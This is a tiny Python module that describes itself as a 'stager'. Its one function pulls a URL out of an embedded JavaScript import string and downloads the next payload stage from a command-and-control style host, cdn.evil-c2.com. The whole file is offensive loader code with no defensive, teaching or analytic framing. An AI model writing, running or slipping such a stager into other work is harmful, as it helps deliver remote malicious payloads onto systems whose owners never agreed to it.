"""Stager that pulls its next stage as a remote ES module at runtime."""

import urllib.request


def fetch_stage(host):
    stub = 'import("https://cdn.evil-c2.com/x.js")'
    url = stub[len('import("'):-len('")')]
    return urllib.request.urlopen(url).read()
